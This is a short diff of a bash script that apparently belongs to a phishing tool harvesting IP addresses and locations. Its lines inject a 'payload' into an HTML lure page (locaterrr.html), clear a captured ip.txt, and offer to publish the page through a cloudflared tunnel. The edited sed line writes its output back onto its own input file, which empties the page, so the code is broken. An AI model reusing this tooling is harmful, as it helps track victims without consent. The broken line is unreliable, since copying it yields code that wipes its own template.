@@ -122,7 +122,7 @@ fi
 if [[ -e ip.txt ]]; then
 rm -rf ip.txt
 fi
-sed -e '/tc_payload/r payload' locaterrr.html > index.html
+sed -e '/tc_payload/r payload' locaterrr.html > locaterrr.html
 default_option_server="Y"
 read -p $'\n\e[1;93m Do you want to use cloudflared tunnel?\n \e[1;92motherwise it will be run on localhost:8080 [Default is Y] [Y/N]: \e[0m' option_server
 option_server="${option_server:-${default_option_server}}"
